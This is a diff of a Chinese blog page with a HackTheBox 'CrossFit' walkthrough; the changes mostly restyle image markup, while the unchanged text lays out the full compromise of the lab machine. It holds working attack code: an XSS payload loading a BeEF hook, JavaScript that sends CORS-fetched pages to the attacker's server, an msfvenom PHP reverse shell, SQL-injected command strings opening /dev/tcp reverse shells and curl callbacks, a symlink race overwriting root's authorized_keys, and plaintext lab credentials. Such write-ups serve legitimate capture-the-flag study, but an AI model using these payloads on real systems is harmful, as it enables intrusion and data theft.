@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;277  10.10.10.208   端口扫描21,22和80: 1234567891011121314151617181920212223$ nmap -sC -sV 10.10.10.208Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2020-1">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;277  10.10.10.208                                                                                                              端口扫描21,22和80: 123456">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CrossFit - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/12/02/CrossFit-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;277  10.10.10.208   端口扫描21,22和80: 1234567891011121314151617181920212223$ nmap -sC -sV 10.10.10.208Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2020-1">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;277  10.10.10.208                                                                                                              端口扫描21,22和80: 123456">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120109.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120110.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120111.jpg">
@@ -142,7 +142,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -232,23 +232,58 @@
 </li>
 <li><h2 id="10-10-10-208"><a href="#10-10-10-208" class="headerlink" title="10.10.10.208"></a>10.10.10.208</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120109.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120109.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>21,22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.208</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-01 14:59 CST</span><br><span class="line">Nmap scan report for 10.10.10.208</span><br><span class="line">Host is up (0.074s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US</span><br><span class="line">| Not valid before: 2020-04-30T19:16:46</span><br><span class="line">|_Not valid after:  3991-08-16T19:16:46</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b0:e7:5f:5f:7e:5a:4f:e8:e4:cf:f1:98:01:cb:3f:52 (RSA)</span><br><span class="line">|   256 67:88:2d:20:a5:c1:a7:71:50:2b:c8:07:a4:b2:60:e5 (ECDSA)</span><br><span class="line">|_  256 62:ce:a3:15:93:c8:8c:b6:8e:23:1d:66:52:f4:4f:ef (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 31.39 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>apache默认页面：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120110.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120110.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p>21配置了ssl，检查证书能够得到子域名和一个邮箱：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect 10.10.10.208:21 -starttls ftp</span><br><span class="line"></span><br><span class="line">info@gym-club.crossfit.htb</span><br><span class="line">gym-club.crossfit.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120111.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120111.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>配置hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.208 crossfit.htb gym-club.crossfit.htb</span><br></pre></td></tr></table></figure>
 
 <h2 id="gym-club-crossfit-htb"><a href="#gym-club-crossfit-htb" class="headerlink" title="gym-club.crossfit.htb"></a>gym-club.crossfit.htb</h2><p>是一个健身房网站：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120112.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120112.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>并且存在XSS检测：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120113.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120113.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p> 注意XSS检测提示信息：</p>
 <blockquote>
 <p>A security report containing your IP address and browser information will be generated and our admin team will be immediately notified.</p>
@@ -256,35 +291,114 @@
 <p>浏览器信息之类的会发给管理员查看，那么如果在UA里进行XSS让管理员查看呢，因为靶机环境不能用外部XSS平台，就用beef吧：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.12:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120114.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120114.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>注意发送的message需要有xss payload才能触发管理员去访问查看UA，然后XSS上线：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120115.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120115.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><p>ftp.crossfit.htb(这个域名怎么来的，不知道，wp里都说是别人给的提示,或者根据21端口ftp猜域名？)（ 补充：根据参考资料里是header里<code>&quot;Origin: http://$FUZZ.$DOMAIN&quot;</code>可以fuzz出来哪些有效）这个配置了CORS，就是一步步获取网页结构，参数格式之类的。可以创建新的ftp账号，但有token，beef不行，需要自定义xss代码：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120116.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120116.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="ftp-crossfit-htb"><a href="#ftp-crossfit-htb" class="headerlink" title="ftp.crossfit.htb"></a>ftp.crossfit.htb</h2><p>第一次请求到token，第二次发送创建账号的request的时候，token就过期了，得自己写一个, 添加ftp账号：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120117.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120118.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120117.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120118.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 解码内容表明添加账号成功：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120119.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120119.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="adduser-js"><a href="#adduser-js" class="headerlink" title="adduser.js"></a>adduser.js</h2><p>注意正则那里，直接用的参考资料里的脚本，少个/,自己加上</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">myhttpserver = <span class="string">'http://10.10.14.12:3000/'</span></span><br><span class="line">targeturl = <span class="string">'http://ftp.crossfit.htb/accounts/create'</span></span><br><span class="line"></span><br><span class="line">req = <span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">            req2 = <span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line">            req2.open(<span class="string">'GET'</span>, myhttpserver + btoa(<span class="keyword">this</span>.responseText),<span class="literal">false</span>);</span><br><span class="line">            req2.send();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">req.withCredentials = <span class="literal">true</span>;        <span class="comment">//这个是必须的，不然无法关联 /accounts/create 和 /accounts的连续两次请求</span></span><br><span class="line">req.open(<span class="string">'GET'</span>, targeturl, <span class="literal">false</span>);</span><br><span class="line">req.send();</span><br><span class="line"></span><br><span class="line">reg = <span class="regexp">/"_token" value="(.*)"/g</span>;</span><br><span class="line">token = reg.exec(req.responseText)[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line">formData.append(<span class="string">"username"</span>, <span class="string">"miao"</span>);</span><br><span class="line">formData.append(<span class="string">"pass"</span>, <span class="string">"miao123456"</span>);</span><br><span class="line">formData.append(<span class="string">"_token"</span>,token);</span><br><span class="line">req.open(<span class="string">'POST'</span>, <span class="string">'http://ftp.crossfit.htb/accounts'</span>, <span class="literal">true</span>);</span><br><span class="line">req.send(formData);</span><br></pre></td></tr></table></figure>
 
 <h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p>因为ftp用了ssl，需要用支持的客户端连接,得到一个新的development，(ls就可能会有证书错误，自己改下.lftprc):</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120120.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120120.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="lftprc"><a href="#lftprc" class="headerlink" title=".lftprc"></a>.lftprc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set ftp:ssl-auth TLS</span><br><span class="line">set ftp:ssl-force true</span><br><span class="line">set ftp:ssl-allow yes</span><br><span class="line">set ftp:ssl-protect-list yes</span><br><span class="line">set ftp:ssl-protect-data yes</span><br><span class="line">set ftp:ssl-protect-fxp yes</span><br><span class="line">set ssl:verify-certificate no</span><br></pre></td></tr></table></figure>
 
 <h1 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h1><p>然后就是通过FTP写shell，然后XSS CORS去访问新的子域名<code>development-test.crossfit.htb</code>触发webshell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.14.12" LPORT=4444 -f raw &gt; miao.php</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这一步也可以自己编辑，去掉开头的注释</span></span><br><span class="line">cat miao.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; miao.php &amp;&amp; pbpaste &gt;&gt; miao.php</span><br></pre></td></tr></table></figure>
 
 <p>FTP传shell：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120121.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120121.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>触发shell：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120122.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120123.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120122.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120123.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shell-js"><a href="#shell-js" class="headerlink" title="shell.js"></a>shell.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">myhttpserver = <span class="string">'http://10.10.14.12:3000/'</span></span><br><span class="line">targeturl = <span class="string">'http://development-test.crossfit.htb/miao.php'</span></span><br><span class="line"></span><br><span class="line">req = <span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line">req.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">            req2 = <span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line">            req2.open(<span class="string">'GET'</span>, myhttpserver + btoa(<span class="keyword">this</span>.responseText),<span class="literal">false</span>);</span><br><span class="line">            req2.send();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">req.open(<span class="string">'GET'</span>, targeturl, <span class="literal">false</span>);</span><br><span class="line">req.send();</span><br></pre></td></tr></table></figure>
 
 <h1 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h1><p>简单的枚举能够发现/etc/ansible/playbooks/adduser_hank.yml文件，里面有个hash：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120124.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120124.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>破解出来hank用户密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line">powerpuffgirls   (?)</span><br></pre></td></tr></table></figure>
 
@@ -293,7 +407,14 @@
 <h2 id="adduser-hank-yml"><a href="#adduser-hank-yml" class="headerlink" title="adduser_hank.yml"></a>adduser_hank.yml</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"></span><br><span class="line"><span class="attr">- name:</span> <span class="string">Add</span> <span class="string">new</span> <span class="string">user</span> <span class="string">to</span> <span class="string">all</span> <span class="string">systems</span></span><br><span class="line"><span class="attr">  connection:</span> <span class="string">network_cli</span></span><br><span class="line"><span class="attr">  gather_facts:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  hosts:</span> <span class="string">all</span></span><br><span class="line"><span class="attr">  tasks:</span></span><br><span class="line"><span class="attr">    - name:</span> <span class="string">Add</span> <span class="string">the</span> <span class="string">user</span> <span class="string">'hank'</span> <span class="string">with</span> <span class="string">default</span> <span class="string">password</span> <span class="string">and</span> <span class="string">make</span> <span class="string">it</span> <span class="string">a</span> <span class="string">member</span> <span class="string">of</span> <span class="string">the</span> <span class="string">'admins'</span> <span class="string">group</span></span><br><span class="line"><span class="attr">      user:</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">hank</span></span><br><span class="line"><span class="attr">        shell:</span> <span class="string">/bin/bash</span></span><br><span class="line">	<span class="attr">password:</span> <span class="string">$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/</span></span><br><span class="line"><span class="attr">        groups:</span> <span class="string">admins</span></span><br><span class="line"><span class="attr">        append:</span> <span class="literal">yes</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>用得到的密码ssh登录hank，用户目录得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120201.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120201.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>在crontab里看到有定时任务，每分钟以isaac用户权限执行<code>/usr/bin/php /home/isaac/send_updates/send_updates.php</code></p>
 <p>查看php发现用到<code>use mikehaertl\shellcommand\Command</code>,版本号在composer.json里是1.6.0，搜索发现相关漏洞：</p>
 <ul>
@@ -312,16 +433,58 @@
 <h2 id="etc-pam-d-vsftpd"><a href="#etc-pam-d-vsftpd" class="headerlink" title="/etc/pam.d/vsftpd"></a>/etc/pam.d/vsftpd</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">auth sufficient pam_mysql.so user&#x3D;ftpadm passwd&#x3D;8W)&#125;gpRJvAmnb host&#x3D;localhost db&#x3D;ftphosting table&#x3D;accounts usercolumn&#x3D;username passwdcolumn&#x3D;pass crypt&#x3D;3</span><br><span class="line">account sufficient pam_mysql.so user&#x3D;ftpadm passwd&#x3D;8W)&#125;gpRJvAmnb host&#x3D;localhost db&#x3D;ftphosting table&#x3D;accounts usercolumn&#x3D;username passwdcolumn&#x3D;pass crypt&#x3D;3</span><br><span class="line"></span><br><span class="line"># Standard behaviour for ftpd(8).</span><br><span class="line">auth    required        pam_listfile.so item&#x3D;user sense&#x3D;deny file&#x3D;&#x2F;etc&#x2F;ftpusers onerr&#x3D;succeed</span><br><span class="line"></span><br><span class="line"># Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.</span><br><span class="line"></span><br><span class="line"># Standard pam includes</span><br><span class="line">@include common-account</span><br><span class="line">@include common-session</span><br><span class="line">@include common-auth</span><br><span class="line">auth    required        pam_shells.so</span><br></pre></td></tr></table></figure>
 
 <h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>结合代码，触发方式需要我们用ftpadm登录写入文件，然后把数据库里写入恶意命令等待执行触发：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120202.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120203.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120202.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120203.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>可以看到命令执行成功，修改下命令即可得到isaac用户shell：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120204.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120205.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120204.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120205.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="commands"><a href="#commands" class="headerlink" title="commands"></a>commands</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit</span><br><span class="line">insert into users (email) values (&quot;test | curl 10.10.14.12:3000&#x2F;&#96;whoami&#96;&quot;);</span><br><span class="line">insert into users (email) values (&quot;test | bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.12&#x2F;4445 0&gt;&amp;1&#39;&quot;);</span><br><span class="line">insert into users (email) values (&quot;-E $(bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.12&#x2F;4445 0&gt;&amp;1&#39;)&quot;);</span><br></pre></td></tr></table></figure>
 
 <h1 id="usr-bin-dbmsg"><a href="#usr-bin-dbmsg" class="headerlink" title="/usr/bin/dbmsg"></a>/usr/bin/dbmsg</h1><p>跑下pspy64之类的能够发现这个在定时跑，下载下来分析：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120206.jpg" alt=""></p>
-<h2 id="process-data"><a href="#process-data" class="headerlink" title="process_data"></a>process_data</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120207.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120206.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="process-data"><a href="#process-data" class="headerlink" title="process_data"></a>process_data</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120207.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>大概流程就是从mysql里获取数据，写到<code>/var/local/</code> 下面，文件名生成就是用当前时间作为种子，生成随机数，然后在后面加上1(注意看<code>snprintf(local_c8,0x30,&quot;%d%s&quot;,(ulong)uVar2,lVar3);</code>, Var3来自于local_38，local_3是<code>mysql_fetch_row</code>的返回值)，然后再求md5值，作为文件名。这里存在一个漏洞，因为文件名在特定的时间是确定的，如果我去把相应的文件名作为软链接到其他文件上，那是不是就可以覆盖其他文件内容了？</p>
 <h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p> 测试环节略过，实际就是直接写公钥,自己编译随机数程序：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -f id_rsa</span><br></pre></td></tr></table></figure>
@@ -333,7 +496,14 @@
 <h2 id="sql-amp-竞争"><a href="#sql-amp-竞争" class="headerlink" title="sql &amp; 竞争"></a>sql &amp; 竞争</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e'insert into messages (id, name, email,message) values (1, "test","test@test.com","thisisatestmessage");'</span><br><span class="line">while true; do ln -s /tmp/test /var/local/$(echo -n $(./test) | md5sum | cut -d " " -f 1) 2&gt;/dev/null; done</span><br><span class="line"></span><br><span class="line">mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e'insert into messages (id, name, email,message) values (1, "ssh-ed25519","miao@miao","AAAAC3NzaC1lZDI1NTE5AAAAIGxxGiUiObPWiHCxE/xTCAlHSkGC0qiOtrxUYNar8I6I");'</span><br><span class="line">while true; do ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./test) | md5sum | cut -d " " -f 1) 2&gt;/dev/null; done</span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>然后等待竞争成功，root登录，得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120208.jpg" alt=""></p>
+<figure class="image-bubble">
